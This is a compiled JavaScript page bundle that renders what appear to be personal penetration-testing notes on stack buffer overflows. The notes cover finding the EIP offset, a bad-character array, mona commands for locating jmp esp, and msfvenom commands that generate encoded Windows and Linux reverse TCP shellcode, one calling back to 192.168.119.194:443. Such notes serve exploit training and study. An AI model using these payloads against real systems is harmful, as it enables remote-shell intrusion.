(window.webpackJsonp=window.webpackJsonp||[]).push([[55],{396:function(a,s,t){"use strict";t.r(s);var e=t(13),r=Object(e.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"buffer-overflows"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#buffer-overflows"}},[a._v("#")]),a._v(" Buffer overflows")]),a._v(" "),s("ol",[s("li",[a._v("Search for buffer overflow vunlerability by determining at what length does the program crash")]),a._v(" "),s("li",[a._v("Search for where instruction pointer is overwritten by generating non-repeating payload then finding the offset at which "),s("code",[a._v("eip")]),a._v(" is overwritten")]),a._v(" "),s("li",[a._v("Find the bad characters by using all the possible hex values and looking at the stack to see which characters didn't make it through")]),a._v(" "),s("li",[a._v("Find which register points to somewhere in the stack where we can write to")]),a._v(" "),s("li",[a._v("Find an instruction that jumps to the register ie. "),s("code",[a._v("jmp esp")])]),a._v(" "),s("li",[a._v("Get that instructions address and overwrite "),s("code",[a._v("eip")]),a._v(" with that")]),a._v(" "),s("li",[a._v("Use the register's location and put our shell code there")])]),a._v(" "),s("h2",{attrs:{id:"create-pattern"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#create-pattern"}},[a._v("#")]),a._v(" Create pattern")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("msf-pattern_create "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-l")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),a._v("length"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v("\n")])])]),s("h2",{attrs:{id:"pattern-offset-finder"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#pattern-offset-finder"}},[a._v("#")]),a._v(" Pattern offset finder")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("msf-pattern_offset "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-q")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),a._v("pattern_found"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v("\n")])])]),s("h2",{attrs:{id:"generate-assembly-instruction-opcodes"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#generate-assembly-instruction-opcodes"}},[a._v("#")]),a._v(" Generate assembly instruction opcodes")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("msf-nasm_shell\nnasm "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("add")]),a._v(" eax,12\n00000000  83C00C            "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("add")]),a._v(" eax,byte +0xc\n")])])]),s("h2",{attrs:{id:"mona-finding-jmp-esp"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#mona-finding-jmp-esp"}},[a._v("#")]),a._v(" Mona finding jmp esp")]),a._v(" "),s("p",[a._v("First find one where everything is false like "),s("code",[a._v("ASLR")]),a._v(" and such:")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("!")]),a._v("mona modules\n")])])]),s("p",[a._v("once the "),s("code",[a._v(".dll")]),a._v(" or "),s("code",[a._v(".exe")]),a._v(" is found, we can use mona to find the command:")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("!")]),a._v("mona "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("find")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-s")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("'\\xff\\xe4'")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-m")]),a._v(" pprogramname.exe\n")])])]),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("!")]),a._v("mona jmp "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-r")]),a._v(" esp\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# click view > log or press alt + L")]),a._v("\n")])])]),s("p",[a._v("or")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("!")]),a._v("mona "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("find")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-s")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("'\\xff\\xe4'")]),a._v("\n")])])]),s("p",[s("strong",[a._v("Remember to send the address in little endian")])]),a._v(" "),s("h2",{attrs:{id:"bad-characters"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#bad-characters"}},[a._v("#")]),a._v(" Bad characters")]),a._v(" "),s("p",[s("strong",[a._v("Be aware that if a buffer overflow is strict on length, then some bad characters that don't make it through will result in the buffer overflow crash not being triggered.")])]),a._v(" "),s("p",[a._v("The following is missing "),s("code",[a._v("\\x00,\\x1A,\\x1D")])]),a._v(" "),s("div",{staticClass:"language-python extra-class"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[a._v("badchars "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0b\\x0c\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f"')]),a._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40"')]),a._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f"')]),a._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f"')]),a._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f"')]),a._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf"')]),a._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf"')]),a._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff"')]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\n")])])]),s("h2",{attrs:{id:"shell-payloads"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#shell-payloads"}},[a._v("#")]),a._v(" Shell payloads")]),a._v(" "),s("h3",{attrs:{id:"shikata-ga-nai"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#shikata-ga-nai"}},[a._v("#")]),a._v(" Shikata ga nai")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" windows/shell_reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),a._v("listening_host"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),a._v("listening_port"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("EXITFUNC")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("thread "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-f")]),a._v(" c "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-e")]),a._v(" x86/shikata_ga_nai "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-b")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),a._v("illegal characters as string ie. "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x00"}},[a._v("\\x00")]),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x12"}},[a._v("\\x12")]),a._v('..."')]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v("\n")])])]),s("h3",{attrs:{id:"fnstenv-mov"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#fnstenv-mov"}},[a._v("#")]),a._v(" Fnstenv mov")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" windows/shell_reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),a._v("listening host"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),a._v("listening port"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-f")]),a._v(" c "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-e")]),a._v(" x86/fnstenv_mov "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-b")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x00"}},[a._v("\\x00")]),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x0a"}},[a._v("\\x0a")]),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x0d"}},[a._v("\\x0d")]),s("span",{pre:!0,attrs:{class:"token entity",title:"\\xff"}},[a._v("\\xff")]),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x3b"}},[a._v("\\x3b")]),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x45"}},[a._v("\\x45")]),a._v('..."')]),a._v("\n")])])]),s("h3",{attrs:{id:"linux-reverse-tcp-shells"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#linux-reverse-tcp-shells"}},[a._v("#")]),a._v(" Linux reverse tcp shells")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" linux/x86/shell_reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".119.194 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("443")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("EXITFUNC")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("thread "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-f")]),a._v(" c "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-e")]),a._v(" x86/shikata_ga_nai "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-b")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),a._v("illegal characters as string ie. "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x00"}},[a._v("\\x00")]),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x12"}},[a._v("\\x12")]),a._v('..."')]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v("\n")])])])])}),[],!1,null,null,null);s.default=r.exports}}]);